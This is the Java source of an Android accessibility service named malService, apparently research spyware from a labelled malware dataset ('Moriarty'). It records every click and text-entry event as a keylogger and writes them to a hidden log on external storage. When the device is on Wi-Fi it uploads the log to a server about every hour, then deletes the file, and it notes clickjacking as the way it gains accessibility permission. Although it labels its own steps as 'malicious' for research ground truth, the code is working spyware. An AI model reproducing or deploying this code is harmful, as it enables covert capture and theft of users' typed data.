package com.bgu.sherlock.Moriarty;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Environment;
//import androidx.core.content.LocalBroadcastManager;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.FileWriter;

import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.sql.Time;

public class malService extends AccessibilityService {
    private String TAG = "Moriarty";
    private Time lastWifiCheck = new Time(System.currentTimeMillis());
    private Time lastSent = new Time(System.currentTimeMillis());
    private Clues clue = new Clues();

    private int strokes=0;
    private int clicks = 0;

    @Override
    public void onInterrupt() {

    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        try { Log.e(TAG,event.toString()); }catch (Exception e){}
        Singleton.getInstance().shouldAccess = true;

        if (event.getEventType()==AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED)
            strokes++;
        else if(event.getEventType()==AccessibilityEvent.TYPE_VIEW_CLICKED)
            clicks++;

        File mFile = null;
        try {
            File dir = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/Moriarty");
            dir.mkdirs();
            mFile = new File(dir, new StringBuilder().append("ActionLog.txt").toString());
        }
        catch(Exception e){
            Log.e(TAG,e.getMessage());
        }
        try {
            BufferedWriter AccoFile = null;
            FileWriter FW = new FileWriter(mFile,true);
            AccoFile = new BufferedWriter(FW);
            StringBuilder sb = new StringBuilder();
            sb.append(event.toString() +"\n");
            AccoFile.append (sb.toString());
            AccoFile.flush();
            AccoFile.close();

        } catch (Exception e) {
            Log.e(TAG,e.getMessage());
        }

        if (System.currentTimeMillis()-lastWifiCheck.getTime()>(1000*1800))
                checkWifiAndSend();

    }

    private void checkWifiAndSend(){
        clue.SendMal("Probing For Wifi access","Wifi Connection Pending","malicious","malicious");

        if (!(new WifiCheck().isConnectedToWifi(this))) {

            clue.SendMal("Probing For Wifi Connection","Device Is not Connected to a Wifi Network","malicious","malicious");
            return;
        }
        lastWifiCheck.setTime(System.currentTimeMillis());
        Log.e(TAG,"connected to Wifi");
        clue.SendMal("Probing For Wifi Connection","Device Is Connected to a Wifi Network","malicious","malicious");

        if (System.currentTimeMillis() - lastSent.getTime() < (1000*3600))
            return;

        lastSent.setTime(System.currentTimeMillis());
        clue.SendMal("Report","Data Theft Summary (Keystrokes ["+ strokes +"],Clicks ["+ clicks +"]);","Spyware","malicious");
        strokes=0;
        clicks=0;
        clue.SendMal("Sending Data", "Begin: Sending data to server","Spyware","malicious");
        Log.e(TAG,"Sending to server..");
            SendToServer sendd = new SendToServer();


        try(BufferedReader br = new BufferedReader(new FileReader(Environment.getExternalStorageDirectory().getAbsolutePath() + "/Moriarty/ActionLog.txt"))) {
            StringBuilder sb = new StringBuilder();
            String line = br.readLine();

            while (line != null) {
                sb.append(line);
                sb.append(System.lineSeparator());
                line = br.readLine();
            }
            String everything = sb.toString();
            sendd.send(everything,"malicious");
        } catch (IOException e) {
            Log.e(TAG,e.getMessage());
        }

        try{

            File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/Moriarty/ActionLog.txt");
            clue.SendMal("Delete File", "Deleting the temporary Action Log","Spyware","malicious");
            if(file.delete()){
                Log.e(TAG,file.getName() + " is deleted!");
                clue.SendMal("Delete File", file.getName() + " Successfully Deleted!","Spyware","malicious");
            }else{
                Log.e(TAG,"Delete operation is failed.");
                clue.SendMal("Delete File", "Delete operation is failed.","Spyware","malicious");
            }

        }catch(Exception e){

            Log.e(TAG,e.getMessage());

        }


    }

    private void sendRandBroadcast(){


        Intent i = new Intent("goRand");
        LocalBroadcastManager.getInstance(this).sendBroadcast(i);
    }


    @Override
    protected void onServiceConnected() {

        MyApp.sessionId++;
        SharedPreferences settings = getSharedPreferences("MoriartySession", 0);
        SharedPreferences.Editor editor = settings.edit();
        editor.putInt("Moriarty", MyApp.sessionId);
        editor.commit();

        clue.SendMal("Accessibility Permissions","Malicious Service Has been Granted Accessibility Permissions","Clickjacking[" + Singleton.getInstance().clickJacking +"]","malicious");

        Singleton.getInstance().clickJacking = "OFF";

        lastWifiCheck.setTime(System.currentTimeMillis());
        lastSent.setTime(System.currentTimeMillis());
        Singleton.getInstance().haveAccess = true;
        Singleton.getInstance().sHome=true;
        Log.e(TAG,"mal service connected");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.notificationTimeout = 100;
        info.feedbackType = AccessibilityEvent.TYPES_ALL_MASK;
        this.setServiceInfo(info);
        if (!Singleton.getInstance().shouldAccess){
            sendRandBroadcast();
        }
        Singleton.getInstance().shouldAccess=true;

/*
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.notificationTimeout = 100;
        info.feedbackType = AccessibilityEvent.TYPES_ALL_MASK;
        setServiceInfo(info);*/
    }

}
